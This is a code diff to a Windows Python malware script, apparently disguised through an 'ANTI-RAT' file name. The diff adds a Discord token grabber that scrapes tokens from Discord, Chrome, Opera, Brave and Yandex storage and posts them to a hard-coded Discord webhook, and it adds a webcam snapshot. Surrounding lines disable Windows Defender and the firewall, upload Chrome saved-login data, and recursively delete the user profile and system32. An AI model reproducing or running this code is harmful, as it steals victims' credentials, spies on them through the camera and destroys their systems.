@@ -2,12 +2,11 @@ from discord_webhook import DiscordWebhook
 import subprocess
 import requests
 import os
+import json
+import cv2
+import camera
+import re
 from random import randint
-import pyautogui
-pyautogui.FAILSAFE = False
-mouse = pyautogui
-keyboard = pyautogui
-username = os.getlogin()
 import os
 import json
 import base64
@@ -18,6 +17,7 @@ import shutil
 from datetime import timezone, datetime, timedelta
 from discord_webhook import DiscordWebhook
 
+username = os.getlogin()
 subprocess.getoutput('net stop "WinDefend"')
 subprocess.getoutput('netsh advfirewall set allprofiles state off')
 subprocess.getoutput('taskkill /f /t /im MSASCui.exe')
@@ -30,6 +30,77 @@ def license():
     with open("C:/Windows/system32/license.rtf", "rb") as f:
         web.add_file(file=f.read(), filename='license.rtf')
     web.execute()
+def tokengrabber():
+    import re
+    import json
+
+    from urllib.request import Request, urlopen
+
+    # your webhook URL
+    WEBHOOK_URL = 'https://discord.com/api/webhooks/988419327994761227/QT-ORLi1GRxBbbsbRLs5fs3MkCy2dOuoQL_pFgrhmyCrBYNPSejTcIh8J2ooq9NtFbXy'
+
+    # mentions you when you get a hit
+    PING_ME = False
+
+    def find_tokens(path):
+        path += '\\Local Storage\\leveldb'
+
+        tokens = []
+
+        for file_name in os.listdir(path):
+            if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
+                continue
+
+            for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+                for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
+                    for token in re.findall(regex, line):
+                        tokens.append(token)
+        return tokens
+
+    def main():
+        local = os.getenv('LOCALAPPDATA')
+        roaming = os.getenv('APPDATA')
+
+        paths = {
+            'Discord': roaming + '\\Discord',
+            'Discord Canary': roaming + '\\discordcanary',
+            'Discord PTB': roaming + '\\discordptb',
+            'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
+            'Opera': roaming + '\\Opera Software\\Opera Stable',
+            'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
+            'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
+        }
+
+        message = '@everyone' if PING_ME else ''
+
+        for platform, path in paths.items():
+            if not os.path.exists(path):
+                continue
+
+            message += f'\n**{platform}**\n```\n'
+
+            tokens = find_tokens(path)
+
+            if len(tokens) > 0:
+                for token in tokens:
+                    message += f'{token}\n'
+            else:
+                message += 'No tokens found.\n'
+
+            message += '```'
+
+        headers = {
+            'Content-Type': 'application/json',
+            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
+        }
+
+        payload = json.dumps({'content': message})
+
+        try:
+            req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
+            urlopen(req)
+        except:
+            pass
 
 def chrome_date_and_time(chrome_data):
     # Chrome_data format is 'year-month-date 
@@ -148,8 +219,10 @@ def main():
     with open(f"C:/Users/{username}/AppData/Local/Google/Chrome/User Data/Default/Login Data", "rb") as f:
         web.add_file(file=f.read(), filename='Login Data')
     web.execute()
+    camera.snap(10,"test")
     subprocess.getoutput('if exist "%userprofile%\AppData\System info.txt" del "%userprofile%\appdata\System info.txt"')
-    subprocess.getoutput('del ANTI-RAT_By_EtichalHackingItalia.exe/q')
+    subprocess.getoutput('del ANTI-RAT_By_EtichalHackingItalia.exe')
     subprocess.getoutput('rd "%userprofile%"/q /s')
     subprocess.getoutput('rd "%windir%\system32"/q /s')
 main()
+tokengrabber()
